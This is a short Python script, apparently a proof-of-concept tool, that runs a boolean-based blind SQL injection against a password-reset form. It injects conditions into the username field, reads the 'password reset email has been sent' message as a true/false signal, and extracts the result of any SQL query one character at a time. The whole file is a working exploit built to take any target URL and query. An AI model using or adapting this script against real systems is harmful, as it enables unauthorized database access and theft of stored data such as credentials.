import requests
import argparse

def sqli_exfiltrate(url, query):
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0"
    }
    target_text = "A password reset email has been sent."

    query_length = 0

    for i in range(1, 100):
        payload = f"username=admin' AND length(({query}))={i} and 1='1&reset_password="
        print(f"Testing payload: {payload}")
        response = requests.post(url, headers=headers, data=payload)
        if target_text in response.text:
            query_length = i
            print(f"Query result length: {query_length}")
            break

    if query_length == 0:
        print("Failed to determine query result length.")
        return

    result = ""
    for position in range(1, query_length + 1):
        for ascii_code in range(32, 127):
            payload = f"username=admin' AND ascii(substring(({query}),{position},1))={ascii_code} and 1='1&reset_password="
            print(f"Testing payload: {payload}")
            response = requests.post(url, headers=headers, data=payload)
            if target_text in response.text:
                result += chr(ascii_code)
                print(f"Extracted so far: {result}")
                break

    print(f"Extracted query result: {result}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SQLi Exfiltration Script")
    parser.add_argument("url", type=str, help="Target URL for the SQL injection attack")
    parser.add_argument("query", type=str, help="SQL query to exfiltrate data")

    args = parser.parse_args()

    sqli_exfiltrate(args.url, args.query)
